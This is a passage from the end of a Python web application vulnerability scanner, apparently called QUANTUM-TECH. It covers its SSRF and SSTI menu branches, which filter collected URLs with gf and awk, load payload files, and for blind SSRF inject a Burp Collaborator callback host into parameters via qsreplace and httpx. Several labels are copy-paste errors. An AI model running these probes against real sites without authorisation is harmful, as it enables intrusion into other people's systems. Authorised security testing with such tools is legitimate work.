                                        sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                        elif user_option in ["NO", "N", "No", "no", "n"]:
                            # ----- RE-CALL (VULNERABILITY-SCANNER) - FUNCTION -----
                            WAVS.vulnerability_scanner(file_path, target_name)

                        else:
                            # EXIT, VULNERABILITY-SCANNER :
                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                    # ----- SSRF ----- :
                    elif int_choice == 4:
                        # SSRF (SERVER-SIDE-REQUEST-FORGERY) - VULNERABILITY :
                        print("\n[+] CURRENT-TASK : SCANNING FOR 'SSRF' VULNERABILITY !")
                        # WARNING-MESSAGE :
                        print(f"\n[!] WARNING : CURRENT-TASK (SSRF-VULNERABILITY-SCAN), WILL TAKE SEVERAL '(MINUTES OR HOURS)', BASED ON (SUB-DOMAINS OR WEBSITE) ...")
                        user_option = str(input(f"\n>>> DO YOU WANT TO CONTINYE : [Y]ES OR [N]O : "))

                        # CHECK, USER-OPTION :
                        if user_option in ["YES", "Y", "Yes", "yes", "y"] or len(user_option) == 0:
                            # ----- 'GF-TOOL' (SSRF-PATTERN) - PARAMTERS -----
                            print(f"\n[+] CURRENT-TASK : USING 'GF-TOOL', TO (FIND) 'SSRF' (VULNERABLE-PARAMTERS) !")
                            # RUN-COMMAND :
                            WAVS.run_command(f"cat {file_path}/final_urls.txt | gf ssrf | tee {file_path}/ssrf_vuln_urls.txt")

                            # ---------- BANNER-NAME (SSRF) ---------- :
                            ascii_banner = pyfiglet.figlet_format("SSRF (SERVER-SIDE-REQUEST-FORGERY)", font="slant")
                            print(f"\n\033[97m {ascii_banner} \033[0m")
                            print("\n")

                            # ----- REMOVE, (NOISE & DUPLICATION) FROM FILE : LFI_VULN_URLS -----
                            print(f"\n[+] CURRENT-TASK : USING 'AWK' (TOOL), TO REMOVE DUPLICATION ...")
                            WAVS.run_command(f"awk -F'?' '!seen[$1]++' {file_path}/ssrf_vuln_urls.txt | tee {file_path}/ssrf_clean_vuln_urls.txt")

                            # ----- BURP-SUITE (TESTING) ----- :
                            print(f"\n[!] ATTENTION ! NOW DO YOU WANT TO TEST 'SSRF-VAULNERABILITY' THROUGH (BURP-SUITE) COLLABORATOR (TECNIQUE) ?")
                            your_choice = str(input(f"\n>>> IF, WANT TO USE (BURP-SUITE) THEN PRESS [Y]ES OR [N]O : ")).strip()

                            if your_choice in ["YES", "Yes", "yes", "Y", "y"]:
                                print(f"\n[+] CURRENT-TASK : USING (BURP-SUITE) COLLABORATOR (SUB-DOMAIN) FOR BLIND-SSRF !")
                                collaborator = str(input(f"\n>>> ENTER, YOUR (BURP-SUITE) COLLABORATOR : ")).strip()

                                # CHECK, COLLABORATOR :
                                if len(collaborator) == 0:
                                    print(f"\n[-] CURRENT-TASK : 'FAILED' ! PLEASE PROVIDE AN 'BURP-SUITE (COLLABORATOR-ID)' !")

                                else:
                                    print(f"\n[+] CURRENT-TASK : USING (BURP-SUITE) COLLABORATOR : {collaborator} TO, CHECK SSRF-VULNERABILITY !")
                                    # RUN-COMMAND :
                                    WAVS.run_command(f"cat {file_path}/ssrf_clean_vuln_urls.txt | qsreplace 'http://{collaborator}' | httpx -silent | tee {file_path}/ssrf_burp_suite.txt")

                                    # MESSAGE :
                                    print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! SSRF (VULNERABLILITY-SCAN) WAS COMPLETED !")

                            elif your_choice in ["NO", "No", "no", "N", "n"]:
                                # ----- LOAD-PAYLOADS (LFI) ----- :
                                print(f"\n[+] CURRENT-TASK : LOADING... 'SSRF' (PAYLOADS) !")
                                ssrf_payloads = WAVS.load_payloads(f"Payloads/SSRF_Payloads.txt")
                                # CHECK, PAYLOAD FILE :
                                if not ssrf_payloads:
                                    print(f"\n[!] ATTENTION : FILE [SSRF-PAYLOADS.TXT] SEEMS TO BE 'EMPTY' !")

                                else:
                                    # LOOP-CONDITION (VARIBALE) :
                                    loop_condition = True
                                    # ----- TEST-LFI (VULNERABILITY) ----- :
                                    while loop_condition:
                                        print(f"\n[+] CURRENT-TASK : DISPLAY, LIST OF 'SSRF VULNERABLILITY' URL's !")
                                        # RUN-COMMAND :
                                        WAVS.run_command(f"cat {file_path}/ssrf_clean_vuln_urls.txt")

                                        print(f"\n[!] ATTENTION ! PLEASE PROVIDE AN (LFI) - VULNERABLE URL'S FROM FILE : {file_path}/ssrf_clean_vuln_urls.txt | JUST COPY & PASTE THE URL ...")

                                        # ASK, USER TO PROVIDE AN 'VULNERABLE-URL' :
                                        vulnerable_url = str(input(f"\n>>> ENTER, 'VULNERABLE-URL' FROM THE ABOVE LIST : ")).strip()

                                        # CHECK, URL :
                                        try:
                                            regex = re.compile(
                                                r'^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?'  # SCHEMA
                                                r'([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}'  # DOMAIN
                                                r'(:[0-9]{1,5})?(\/.*)?$'  # OPTIONAL (PORT & PATH)
                                            )

                                            if len(vulnerable_url) == 0:
                                                print(f"\n[-] CURRENT-TASK : 'FAILED' ! PLEASE PROVIDE AN 'URL' !")

                                            elif re.match(regex, vulnerable_url):
                                                # RUN-COMMAND :
                                                WAVS.run_command(f"touch {file_path}/ssrf_vulnerability_output.txt")
                                                print(f"\n[+] CURRENT-TASK : TESTING 'SSRF-VULNERABILITY' ON CURRENT-URL : {vulnerable_url} ...")
                                                # ----- TEST 'LFI' (FUNCTION) ----- :
                                                WAVS.test_ssrf(vulnerable_url, ssrf_payloads,f"{file_path}/ssrf_vulnerability_output.txt")

                                                # ----- LFI-VULNERABILITY (FILE) - OUTPUT -----
                                                print(f"\n[+] CURRENT-TASK : DISPLAY, FILE : {file_path}/ssrf_vulnerability_output.txt ! TO CHECK-OUT VULNERABLE URL'S ...")
                                                # CHECK, FILE :
                                                with open(f"{file_path}/ssrf_vulnerability_output.txt", 'r') as file:
                                                    file_data = file.read().strip()

                                                if len(file_data) == 0:
                                                    print(f"\n[!] CURRENT-TASK : 'FAILED' ! NO, SSRF-VULNERABLE (URL'S) FOUND TRY WITH ANOTHER URL ...")

                                                else:
                                                    # RUN-COMMAND :
                                                    WAVS.run_command(f"cat {file_path}/ssrf_vulnerability_output.txt")

                                                # ----- TEST, ANOTHER (URL) -----
                                                print(f"\n\n[*] SO, DO YOU WANT TO TEST ANOTHER (URL) FOR 'SSRF-VULNERABILITY' ?")
                                                choice = str(input(f"\n>>> SO, WHAT YOUR CHOICE : [Y]ES OR [N]O : ")).strip()

                                                try:
                                                    if choice in ["YES", "Yes", "yes", "Y", "y"]:
                                                        continue

                                                    else:
                                                        # MESSAGE :
                                                        print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! SSRF (VULNERABLILITY-SCAN) WAS COMPLETED !")
                                                        # EXIT :
                                                        loop_condition = False

                                                except ValueError:
                                                    print(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")
                                                    loop_condition = False

                                            else:
                                                print(f"\n[-] CURRENT-TASK : 'FAILED' ! IN-VALID URL, TRY AGAIN !")
                                                loop_condition = False

                                        except ValueError:
                                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                            else:
                                print(f"\n[-] CURRENT-TASK : 'FAILED' ! YOU DIDN'T PROVIDE AN VAILD CHOICE, TRY AGAIN !")

                        elif user_option in ["NO", "N", "No", "no", "n"]:
                            # ----- RE-CALL (VULNERABILITY-SCANNER) - FUNCTION -----
                            WAVS.vulnerability_scanner(file_path, target_name)

                        else:
                            # EXIT, VULNERABILITY-SCANNER :
                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                    # ----- SSTI ----- :
                    elif int_choice == 5:
                        # SSTI (SERVER-SIDE-TEMPLET-INJECTION) - VULNERABILITY :
                        print(f"\n[+] CURRRENT-TASK : SCANNING FOR 'SSTI' VULNERABILITY !")
                        # WARNING-MESSAGE :
                        print(f"\n[!] WARNING : CURRENT-TASK (SSTI-VULNERABILITY-SCAN), WILL TAKE SEVERAL '(MINUTES OR HOURS)', BASED ON (SUB-DOMAINS OR WEBSITE) ...")
                        user_option = str(input(f"\n>>> DO YOU WANT TO CONTINYE : [Y]ES OR [N]O : "))

                        # CHECK, USER-OPTION :
                        if user_option in ["YES", "Y", "Yes", "yes", "y"] or len(user_option) == 0:
                            # ----- 'GF-TOOL' (SSTI-PATTERN) - PARAMTERS -----
                            print(f"\n[+] CURRENT-TASK : USING 'GF-TOOL', TO (FIND) 'SSTI' (VULNERABLE-PARAMTERS) !")
                            # RUN-COMMAND :
                            WAVS.run_command(f"cat {file_path}/final_urls.txt | gf ssti | tee {file_path}/ssti_vuln_urls.txt")

                            # ---------- BANNER-NAME (SSTI) ---------- :
                            ascii_banner = pyfiglet.figlet_format("SSTI (SERVER-SIDE-TEMPLET-INJECTION)", font="slant")
                            print(f"\n\033[97m {ascii_banner} \033[0m")
                            print("\n")

                            # ----- REMOVE, (NOISE & DUPLICATION) FROM FILE : SSTI_VULN_URLS -----
                            print(f"\n[+] CURRENT-TASK : USING 'AWK' (TOOL), TO REMOVE DUPLICATION ...")
                            WAVS.run_command(f"awk -F'?' '!seen[$1]++' {file_path}/ssti_vuln_urls.txt | tee {file_path}/ssti_clean_vuln_urls.txt")

                            # ----- LOAD-PAYLOADS (SSTI) ----- :
                            print(f"\n[+] CURRENT-TASK : LOADING... 'SSTI' (PAYLOADS) !")
                            ssti_payloads = WAVS.load_payloads(f"Payloads/SSTI_Payloads.txt")
                            # CHECK, PAYLOAD FILE :
                            if not ssti_payloads:
                                print(f"\n[!] ATTENTION : FILE [LFI-PAYLOADS.TXT] SEEMS TO BE 'EMPTY' !")

                            else:
                                # LOOP-CONDITION (VARIBALE) :
                                loop_condition = True
                                # ----- TEST-SSTI (VULNERABILITY) ----- :
                                while loop_condition:
                                    print(f"\n[+] CURRENT-TASK : DISPLAY, LIST OF 'SSTI VULNERABLILITY' URL's !")
                                    # RUN-COMMAND :
                                    WAVS.run_command(f"cat {file_path}/ssti_clean_vuln_urls.txt")
                                    print(f"\n[!] ATTENTION ! PLEASE PROVIDE AN (LFI) - VULNERABLE URL'S FROM FILE : {file_path}/ssti_clean_vuln_urls.txt | JUST COPY & PASTE THE URL ...")

                                    # ASK, USER TO PROVIDE AN 'VULNERABLE-URL' :
                                    vulnerable_url = str(input(f"\n>>> ENTER, 'VULNERABLE-URL' FROM THE ABOVE LIST : ")).strip()

                                    # CHECK, URL :
                                    try:
                                        regex = re.compile(
                                            r'^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?'  # SCHEMA
                                            r'([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}'  # DOMAIN
                                            r'(:[0-9]{1,5})?(\/.*)?$'  # OPTIONAL (PORT & PATH)
                                        )

                                        if len(vulnerable_url) == 0:
                                            print(f"\n[-] CURRENT-TASK : 'FAILED' ! PLEASE PROVIDE AN 'URL' !")

                                        elif re.match(regex, vulnerable_url):
                                            # RUN-COMMAND :
                                            WAVS.run_command(f"touch {file_path}/ssti_vulnerability_output.txt")
                                            print(f"\n[+] CURRENT-TASK : TESTING 'LFI-VULNERABILITY' ON CURRENT-URL : {vulnerable_url} ...")
                                            # ----- TEST 'SSTI' (FUNCTION) ----- :
                                            WAVS.test_ssti(vulnerable_url, ssti_payloads,f"{file_path}/ssti_vulnerability_output.txt")

                                            # ----- SSTI-VULNERABILITY (FILE) - OUTPUT -----
                                            print(f"\n[+] CURRENT-TASK : DISPLAY, FILE : {file_path}/ssti_vulnerability_output.txt ! TO CHECK-OUT VULNERABLE URL'S ...")
                                            # CHECK, FILE :
                                            with open(f"{file_path}/ssti_vulnerability_output.txt", 'r') as file:
                                                file_data = file.read().strip()

                                            if len(file_data) == 0:
                                                print(
                                                    f"\n[!] CURRENT-TASK : 'FAILED' ! NO, SSTI-VULNERABLE (URL'S) FOUND TRY WITH ANOTHER URL ...")
                                            else:
                                                # RUN-COMMAND :
                                                WAVS.run_command(f"cat {file_path}/ssti_vulnerability_output.txt")

                                            # ----- TEST, ANOTHER (URL) -----
                                            print(f"\n[*] SO, DO YOU WANT TO TEST ANOTHER (URL) FOR 'SSTI-VULNERABILITY' ?")
                                            choice = str(input(f"\n>>> SO, WHAT YOUR CHOICE : [Y]ES OR [N]O : ")).strip()

                                            try:
                                                if choice in ["YES", "Yes", "yes", "Y", "y"]:
                                                    continue

                                                else:
                                                    # MESSAGE :
                                                    print(f"\n[✓] CURRENT-TASK : 'SUCCESS' ! SSTI (VULNERABLILITY-SCAN) WAS COMPLETED !")
                                                    # EXIT :
                                                    loop_condition = False

                                            except ValueError:
                                                print(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")
                                                loop_condition = False

                                        else:
                                            print(f"\n[-] CURRENT-TASK : 'FAILED' ! IN-VALID URL, TRY AGAIN !")
                                            loop_condition = False

                                    except ValueError:
                                        sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                        elif user_option in ["NO", "N", "No", "no", "n"]:
                            # ----- RE-CALL (VULNERABILITY-SCANNER) - FUNCTION -----
                            WAVS.vulnerability_scanner(file_path, target_name)

                        else:
                            # EXIT, VULNERABILITY-SCANNER :
                            sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

                    # ----- EXIT ----- :
                    elif int_choice == 0:
                        # ---------- BANNER-NAME (THANK-YOU) ---------- :
                        print(f"\n[+] CURRENT-TASK : EXIT, 'VULNERABILITY-SCANNER' (MENU) !")
                        ascii_banner = pyfiglet.figlet_format("THANK-YOU ! VISIT AGAIN ...", font="slant")
                        print(f"\n\033[93m {ascii_banner} \033[0m")

                        # EXIT, VULNERABILITY-SCANNER :
                        sys.exit(f"\n***** THANK YOU ! VISIT AGAIN *****")

                    # ----- ERROR -----
                    else:
                        print(f"\n***** OOPS ! SEEM'S LIKE YOU PROVIDED 'WRONG' OPTION ! *****")
                        sys.exit(f"\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")

            except ValueError:
                sys.exit(f"\n***** SOME-THING WENT WRONG, SEEMS LIKE YOU DIDN'T PROVIDE 'VAILD-DATA' ! *****")

# --------------------
# ERROR-HANDLER (FUNCTION) :
# --------------------
def error_handler(sig, frame):
    print(f"\n[!] ERROR-HANDLER ! 'SIG' : {sig} AND 'FRAME' : {frame}")
    # ---------- BANNER-NAME (EXIT) ---------- :
    ascii_banner = pyfiglet.figlet_format("CRTL + C (EXIT)", font="slant")
    print(f"\n[!] ALERT ! LOOKS LIKE YOU PRESS '(CRTL + C)' TO #EXIT, THE #QUANTUM-TECH ! VISIT AGAIN ...")
    sys.exit(f"\n***** THNAK YOU, VISIT AGAIN ! *****")

# USE, SIGNAL (MODULE) :
signal.signal(signal.SIGINT, error_handler)

# --------------------------------------------------------------------------------
# MAIN-METHOD (PROGRAM)
# --------------------------------------------------------------------------------
if __name__ == '__main__':
    try:
        # ---------- BANNER-NAME (QUANTUM-TECH) ---------- :
        ascii_banner = pyfiglet.figlet_format("QUANTUM-TECH", font="slant")
        print(f"\033[93m {ascii_banner} \033[0m")

        # BANNER-NAME (WEB-APPLICATION VULNERABILITY SCANNER) :
        ascii_banner = pyfiglet.figlet_format("WEB APPLICATION VULNERABILITY SCANNER", font="slant")
        print(f"\033[90m {ascii_banner} \033[0m")

        # ---------- CLASS (WAVS) - OBJECT (REFERENCE) ----------
        wavs = WAVS()

        # ---------- INFORMATION-GATHER (FUNCTION) ----------
        wavs.information_gather()

    except KeyboardInterrupt:
        print("\n[!] ALERT ! LOOKS LIKE YOU PRESS '(CRTL + C)' TO #EXIT, THE #QUANTUM-TECH ! VISIT AGAIN ...")
        # ---------- BANNER-NAME (EXIT) ---------- :
        ascii_banner = pyfiglet.figlet_format("THANK-YOU & VISIT AGAIN !", font="slant")
        print(f"\033[93m {ascii_banner} \033[0m")

        sys.exit("\n***** THNAK YOU, VISIT AGAIN ! *****")

    except Exception:
        print(f"\n[!] ERROR ! AN ERROR OCCURED : {Exception}")
        sys.exit("\n***** SOME-THING WENT WRONG, TRY AGAIN ! *****")
